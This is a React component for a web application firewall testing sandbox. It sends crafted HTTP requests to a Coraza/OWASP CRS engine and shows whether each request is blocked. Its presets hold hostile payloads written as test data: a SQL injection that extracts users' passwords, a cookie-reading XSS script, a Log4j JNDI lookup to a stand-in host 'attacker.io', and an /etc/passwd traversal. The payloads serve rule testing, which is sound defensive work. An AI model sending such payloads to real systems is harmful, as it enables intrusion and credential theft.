import React, { useState } from 'react';
import { useApp } from '../context/AppContext';
import { SandboxTestResult } from '../types';
import {
  FlaskConical,
  Play,
  RotateCcw,
  CheckCircle2,
  AlertOctagon,
  Sparkles,
  Zap,
  Terminal,
  Layers,
  ArrowRight,
  ShieldCheck,
  ShieldAlert,
} from 'lucide-react';

export const SandboxView: React.FC = () => {
  const { runSandboxTest } = useApp();

  const [method, setMethod] = useState<'GET' | 'POST' | 'PUT' | 'DELETE'>('POST');
  const [uri, setUri] = useState<string>('/api/v1/auth/token?code=\' UNION SELECT username,password FROM users--');
  const [headers, setHeaders] = useState<string>(
    JSON.stringify(
      {
        'Host': 'api.domain.com',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Content-Type': 'application/json',
      },
      null,
      2
    )
  );
  const [body, setBody] = useState<string>('{"grant_type": "authorization_code"}');

  const [testResult, setTestResult] = useState<SandboxTestResult | null>(null);
  const [isEvaluating, setIsEvaluating] = useState<boolean>(false);

  // Attack preset scenarios
  const presets = [
    {
      name: 'SQLi: Union Select Exploit',
      category: 'SQLi',
      method: 'POST' as const,
      uri: '/api/v1/auth/token?code=\' UNION SELECT username,password FROM users--',
      body: '{"grant_type": "authorization_code"}',
      headers: { 'Host': 'api.domain.com', 'Content-Type': 'application/json' },
    },
    {
      name: 'XSS: Stored Script Payload',
      category: 'XSS',
      method: 'POST' as const,
      uri: '/api/v1/comments',
      body: '{"comment": "<script>alert(document.cookie)</script>"}',
      headers: { 'Host': 'shop.domain.com', 'Content-Type': 'application/json' },
    },
    {
      name: 'RCE: Log4j CVE-2021-44228',
      category: 'RCE',
      method: 'GET' as const,
      uri: '/api/v2/system/health',
      body: '',
      headers: { 'Host': 'api.domain.com', 'User-Agent': '${jndi:ldap://attacker.io/rce}' },
    },
    {
      name: 'LFI: Sensitive File Traversal',
      category: 'LFI',
      method: 'GET' as const,
      uri: '/download?file=../../../../etc/passwd',
      body: '',
      headers: { 'Host': 'admin.internal.io' },
    },
    {
      name: 'Clean: Normal Benign Query',
      category: 'Benign',
      method: 'GET' as const,
      uri: '/api/v1/products?category=electronics&sort=price_asc',
      body: '',
      headers: { 'Host': 'api.domain.com', 'User-Agent': 'Mozilla/5.0 Chrome/126' },
    },
  ];

  const applyPreset = (preset: typeof presets[0]) => {
    setMethod(preset.method);
    setUri(preset.uri);
    setBody(preset.body);
    setHeaders(JSON.stringify(preset.headers, null, 2));
    setTestResult(null);
  };

  const handleExecuteTest = async () => {
    setIsEvaluating(true);
    let parsedHeaders = {};
    try {
      parsedHeaders = JSON.parse(headers);
    } catch {
      parsedHeaders = { 'Host': 'api.domain.com' };
    }

    // Simulate dry-run execution in Go Coraza FTW engine
    await new Promise((r) => setTimeout(r, 450));

    const result = runSandboxTest({
      method,
      uri,
      headers: parsedHeaders,
      body,
    });

    setTestResult(result);
    setIsEvaluating(false);
  };

  return (
    <div className="space-y-6">
      {/* Title */}
      <div>
        <h1 className="text-xl lg:text-2xl font-bold tracking-tight text-white flex items-center gap-2.5">
          <FlaskConical className="w-6 h-6 text-cyan-400" />
          Testing Sandbox & Dry-Run Engine (Go FTW)
        </h1>
        <p className="text-xs lg:text-sm text-slate-400 mt-1">
          Validate custom SecLang rules and OWASP CRS v4 signatures against test HTTP payloads before live deployment
        </p>
      </div>

      {/* Preset Buttons */}
      <div className="p-4 rounded-2xl bg-slate-900/70 border border-slate-800 space-y-2">
        <span className="text-xs font-semibold text-slate-300 flex items-center gap-1.5">
          <Sparkles className="w-3.5 h-3.5 text-cyan-400" />
          Quick Test Scenario Presets
        </span>
        <div className="flex flex-wrap gap-2 pt-1">
          {presets.map((preset, idx) => (
            <button
              key={idx}
              onClick={() => applyPreset(preset)}
              className="px-3 py-1.5 rounded-xl text-xs font-medium bg-slate-800 hover:bg-slate-700 text-slate-200 border border-slate-700/80 hover:border-cyan-500/40 transition-all flex items-center gap-2 shadow-sm"
            >
              <span className={`w-2 h-2 rounded-full ${
                preset.category === 'Benign' ? 'bg-emerald-400' : 'bg-rose-400'
              }`} />
              <span>{preset.name}</span>
            </button>
          ))}
        </div>
      </div>

      {/* Two Column Layout: Request Crafting on Left, FTW Engine Verdict on Right */}
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Left Column: Request Crafting Form */}
        <div className="p-5 rounded-2xl bg-slate-900/70 border border-slate-800/80 shadow-lg space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-base font-semibold text-white flex items-center gap-2">
              <Terminal className="w-4 h-4 text-cyan-400" />
              Craft Test HTTP Request
            </h2>
            <button
              onClick={() => {
                setUri('');
                setBody('');
                setTestResult(null);
              }}
              className="text-xs text-slate-400 hover:text-slate-200 flex items-center gap-1"
            >
              <RotateCcw className="w-3 h-3" />
              Reset
            </button>
          </div>

          <div className="space-y-3.5 text-xs">
            {/* Method & URI */}
            <div className="flex gap-2">
              <select
                value={method}
                onChange={(e) => setMethod(e.target.value as any)}
                className="w-28 px-3 py-2 rounded-xl bg-slate-950 border border-slate-700 text-white font-mono font-bold focus:border-cyan-400 focus:outline-none"
              >
                <option value="GET">GET</option>
                <option value="POST">POST</option>
                <option value="PUT">PUT</option>
                <option value="DELETE">DELETE</option>
              </select>

              <input
                type="text"
                value={uri}
                onChange={(e) => setUri(e.target.value)}
                placeholder="/path?param=payload"
                className="flex-1 px-3 py-2 rounded-xl bg-slate-950 border border-slate-700 text-white font-mono focus:border-cyan-400 focus:outline-none"
              />
            </div>

            {/* Headers JSON */}
            <div>
              <label className="block text-slate-300 font-medium mb-1">HTTP Request Headers (JSON)</label>
              <textarea
                rows={4}
                value={headers}
                onChange={(e) => setHeaders(e.target.value)}
                className="w-full px-3 py-2 rounded-xl bg-slate-950 border border-slate-700 text-cyan-300 font-mono text-xs focus:border-cyan-400 focus:outline-none"
              />
            </div>

            {/* Request Body */}
            <div>
              <label className="block text-slate-300 font-medium mb-1">Request Body / Payload</label>
              <textarea
                rows={4}
                value={body}
                onChange={(e) => setBody(e.target.value)}
                placeholder='e.g. {"username": "admin\" OR 1=1--"}'
                className="w-full px-3 py-2 rounded-xl bg-slate-950 border border-slate-700 text-slate-200 font-mono text-xs focus:border-cyan-400 focus:outline-none"
              />
            </div>

            {/* Run Button */}
            <button
              onClick={handleExecuteTest}
              disabled={isEvaluating}
              className={`w-full py-2.5 rounded-xl text-xs font-bold transition-all flex items-center justify-center gap-2 shadow-lg ${
                isEvaluating
                  ? 'bg-cyan-950 text-cyan-400 cursor-wait'
                  : 'bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-400 hover:to-blue-500 text-slate-950 shadow-cyan-500/20'
              }`}
            >
              <Play className={`w-4 h-4 ${isEvaluating ? 'animate-spin' : ''}`} />
              <span>{isEvaluating ? 'Running Coraza Go FTW Engine...' : 'Run Attack Simulation'}</span>
            </button>
          </div>
        </div>

        {/* Right Column: Coraza Engine Verdict & Diagnostics */}
        <div className="p-5 rounded-2xl bg-slate-900/70 border border-slate-800/80 shadow-lg space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-base font-semibold text-white flex items-center gap-2">
              <Layers className="w-4 h-4 text-purple-400" />
              Coraza WAF Engine Verdict
            </h2>
            <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-slate-800 text-slate-400">
              Coraza v3.2.1 • FTW Sandbox
            </span>
          </div>

          {testResult ? (
            <div className="space-y-4 animate-in fade-in">
              {/* Verdict Banner */}
              <div
                className={`p-4 rounded-xl border flex items-center justify-between ${
                  testResult.status === 'MATCHED'
                    ? 'bg-rose-950/40 border-rose-500/60 text-rose-200 shadow-[0_0_20px_rgba(244,63,94,0.15)]'
                    : 'bg-emerald-950/40 border-emerald-500/60 text-emerald-200 shadow-[0_0_20px_rgba(16,185,129,0.15)]'
                }`}
              >
                <div className="flex items-center gap-3">
                  {testResult.status === 'MATCHED' ? (
                    <ShieldAlert className="w-8 h-8 text-rose-400 shrink-0" />
                  ) : (
                    <ShieldCheck className="w-8 h-8 text-emerald-400 shrink-0" />
                  )}
                  <div>
                    <div className="text-lg font-extrabold font-mono tracking-wide">
                      {testResult.status === 'MATCHED' ? 'BLOCKED (HTTP 403)' : 'PASSED (HTTP 200)'}
                    </div>
                    <div className="text-xs opacity-90 mt-0.5">
                      Verdict: {testResult.action}
                    </div>
                  </div>
                </div>

                <div className="text-right font-mono">
                  <span className="text-xs opacity-75">Overhead</span>
                  <div className="text-sm font-bold text-white">{testResult.evaluation_latency_ms} ms</div>
                </div>
              </div>

              {/* Detailed Metrics */}
              <div className="grid grid-cols-2 gap-3 text-xs">
                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800">
                  <span className="text-[10px] text-slate-400 font-mono">INBOUND ANOMALY SCORE</span>
                  <div className="text-base font-bold font-mono text-cyan-400 mt-1">
                    {testResult.anomaly_score_inbound} / {testResult.anomaly_score_threshold}
                  </div>
                  <div className="text-[10px] text-slate-400 mt-0.5">
                    Threshold trigger limit
                  </div>
                </div>

                <div className="p-3 rounded-xl bg-slate-950 border border-slate-800">
                  <span className="text-[10px] text-slate-400 font-mono">PHASE EVALUATED</span>
                  <div className="text-base font-bold font-mono text-purple-300 mt-1">
                    Phase {testResult.phase_evaluated}
                  </div>
                  <div className="text-[10px] text-slate-400 mt-0.5">
                    Request inspection layer
                  </div>
                </div>
              </div>

              {/* Matched Details */}
              {testResult.triggered_rule_id && (
                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800 space-y-2 text-xs">
                  <div className="text-slate-400 text-[10px] uppercase font-mono tracking-wider">
                    TRIGGERED RULE METADATA
                  </div>
                  <div className="flex items-center gap-2">
                    <span className="px-2 py-0.5 rounded font-mono font-bold bg-rose-500/20 text-rose-300 border border-rose-500/30">
                      Rule #{testResult.triggered_rule_id}
                    </span>
                    <span className="font-semibold text-slate-200">{testResult.rule_name}</span>
                  </div>

                  <div className="pt-2 font-mono text-[11px] text-slate-400 space-y-1">
                    <div>
                      <span className="text-slate-400">Target Variable:</span>{' '}
                      <span className="text-cyan-300">{testResult.matched_var}</span>
                    </div>
                    <div>
                      <span className="text-slate-400">Matched Pattern:</span>{' '}
                      <span className="text-rose-300">{testResult.matched_value}</span>
                    </div>
                  </div>
                </div>
              )}

              {/* Engine Log */}
              <div className="p-3 rounded-xl bg-slate-950 border border-slate-800 font-mono text-[11px] text-slate-400 space-y-1">
                <div className="text-emerald-400">[GO-FTW] Transaction compiled and fed to Coraza v3 runtime</div>
                <div className="text-slate-300">[INSPECTION] {testResult.engine_verdict}</div>
              </div>
            </div>
          ) : (
            <div className="h-72 flex flex-col items-center justify-center text-center p-6 rounded-xl border border-dashed border-slate-800 text-slate-500">
              <FlaskConical className="w-12 h-12 text-slate-700 mb-3" />
              <p className="text-xs font-medium text-slate-400">No test executed yet</p>
              <p className="text-[11px] text-slate-400 max-w-xs mt-1">
                Select a preset scenario or craft your payload on the left, then click "Run Attack Simulation"
              </p>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};
